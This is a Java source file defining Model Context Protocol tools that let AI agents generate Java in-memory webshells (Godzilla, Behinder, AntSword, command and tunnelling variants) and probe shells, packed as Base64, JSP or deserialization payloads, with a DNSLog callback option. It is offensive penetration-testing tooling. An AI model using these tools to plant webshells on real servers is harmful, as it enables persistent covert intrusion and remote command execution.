package com.reajason.javaweb.boot.mcp;

import com.reajason.javaweb.boot.dto.MemShellGenerateRequest;
import com.reajason.javaweb.boot.dto.MemShellGenerateResponse;
import com.reajason.javaweb.boot.dto.ProbeShellGenerateRequest;
import com.reajason.javaweb.boot.dto.ProbeShellGenerateResponse;
import com.reajason.javaweb.boot.service.GenerationService;
import com.reajason.javaweb.boot.vo.PackerVO;
import com.reajason.javaweb.memshell.ServerFactory;
import com.reajason.javaweb.memshell.config.CommandConfig;
import com.reajason.javaweb.memshell.server.AbstractServer;
import com.reajason.javaweb.packer.Packers;
import com.reajason.javaweb.probe.ProbeContent;
import com.reajason.javaweb.probe.ProbeMethod;
import com.reajason.javaweb.probe.generator.response.ResponseBodyGenerator;
import org.springframework.ai.mcp.annotation.McpTool;
import org.springframework.ai.mcp.annotation.McpToolParam;
import org.springframework.stereotype.Component;

import java.util.Arrays;
import java.util.LinkedHashMap;
import java.util.Map;
import java.util.Set;

/**
 * MCP tools that let other agents generate Java memory shells (内存马)
 * and echo/probe shells (回显马) for authorized security testing.
 *
 * @author ReaJason
 * @since 2026/9/30
 */
@Component
public class MemShellMcpTools {

    private final GenerationService generationService;

    public MemShellMcpTools(GenerationService generationService) {
        this.generationService = generationService;
    }

    @McpTool(name = "memshell_capabilities", description = """
            List everything this server can generate: supported target servers mapped to their shell tools \
            and shell (injector) types, available payload packers, probe methods/contents, probe ResponseBody \
            servers, and Command shell encryptors/implementation classes. \
            Always call this first to discover valid enum-like values before calling generate_memshell or generate_probe_shell.""")
    public Map<String, Object> capabilities() {
        Map<String, Object> result = new LinkedHashMap<>();
        Map<String, Map<?, ?>> servers = new LinkedHashMap<>(16);
        for (String supportedServer : ServerFactory.getSupportedServers()) {
            AbstractServer server = ServerFactory.getServer(supportedServer);
            Map<String, Set<String>> map = new LinkedHashMap<>(16);
            for (String shellTool : server.getSupportedShellTools()) {
                Set<String> supportedShellTypes = server.getSupportedShellTypes(shellTool);
                if (supportedShellTypes.isEmpty()) {
                    continue;
                }
                map.put(shellTool, supportedShellTypes);
            }
            servers.put(supportedServer, map);
        }
        result.put("servers", servers);
        result.put("packers", Arrays.stream(Packers.values())
                .filter(packers -> packers.getParentPacker() == null)
                .map(packers -> new PackerVO(
                        packers.name(),
                        Packers.getPackersWithParent(packers.getInstance().getClass())
                                .stream().map(Packers::name).toList()))
                .toList());
        result.put("probeMethods", Arrays.stream(ProbeMethod.values()).map(Enum::name).toList());
        result.put("probeContents", Arrays.stream(ProbeContent.values()).map(Enum::name).toList());
        result.put("probeResponseBodyServers", ResponseBodyGenerator.getSupportedServers());
        result.put("commandEncryptors", Arrays.stream(CommandConfig.Encryptor.values()).map(Enum::name).toList());
        result.put("commandImplementationClasses", Arrays.stream(CommandConfig.ImplementationClass.values()).map(Enum::name).toList());
        return result;
    }

    @McpTool(name = "generate_memshell", description = """
            Generate a Java memory shell (内存马): a fileless webshell injected into a running Java web server, \
            for authorized penetration testing. The request argument mirrors the REST API POST /api/memshell/generate: \
            {"shellConfig": {"server": "Tomcat", "shellTool": "Godzilla", "shellType": "Filter", "targetJreVersion": 50, \
            "shrink": true, "debug": false}, "injectorConfig": {"urlPattern": "/*"}, "shellToolConfig": {...}, "packer": "Base64"}. \
            server/shellTool/shellType must come from memshell_capabilities (e.g. server=Tomcat, shellTool=Godzilla, shellType=Filter). \
            shellToolConfig options depend on shellTool: Godzilla -> godzillaPass + godzillaKey; Behinder -> behinderPass; \
            AntSword -> antSwordPass; Command -> commandParamName (plus optional commandTemplate with a {command} placeholder, \
            encryptor, implementationClass); Suo5/Suo5v2/NeoreGeorg/Proxy -> optional headerName + headerValue; \
            Custom -> shellClassBase64. All blank optional fields fall back to secure random defaults. \
            packer picks the payload format (e.g. Base64, JSP, ScriptEngine, JavaDeserialize; child variants are listed in capabilities). \
            Returns the shell/injector class names, base64-encoded class bytes and the packed payload string \
            (allPackResults when an aggregate packer like JSP is used).""")
    public MemShellGenerateResponse generateMemShell(
            @McpToolParam(required = true, description = "Memory shell generation request, same JSON structure as POST /api/memshell/generate")
            MemShellGenerateRequest request) {
        return generationService.generateMemShell(request);
    }

    @McpTool(name = "generate_probe_shell", description = """
            Generate an echo/probe shell (回显马): a minimal in-memory shell used to verify that memory-shell injection \
            works on a target before deploying a full webshell, for authorized penetration testing. \
            The request argument mirrors the REST API POST /api/probe/generate: \
            {"probeConfig": {"probeMethod": "ResponseBody", "probeContent": "Command", "targetJreVersion": 50}, \
            "probeContentConfig": {...}, "packer": "Base64"}. \
            probeMethod picks the verification channel: DNSLog -> out-of-band DNS callback, probeContentConfig needs \
            {"host": "xxx.dnslog.cn"}; Sleep -> time-based detection, needs {"seconds": 5, "sleepServer": "Tomcat"}; \
            ResponseBody -> echo data in the HTTP response, needs {"server": "Tomcat", "reqParamName": "cmd", \
            "commandTemplate": "optional template with a {command} placeholder"} (valid servers are listed as \
            probeResponseBodyServers in memshell_capabilities). probeContent selects what to echo (Server, OS, JDK, \
            Command, BasicInfo, ...). Returns the probe class name, base64-encoded class bytes and the packed payload string.""")
    public ProbeShellGenerateResponse generateProbeShell(
            @McpToolParam(required = true, description = "Probe (echo) shell generation request, same JSON structure as POST /api/probe/generate")
            ProbeShellGenerateRequest request) {
        return generationService.generateProbeShell(request);
    }
}
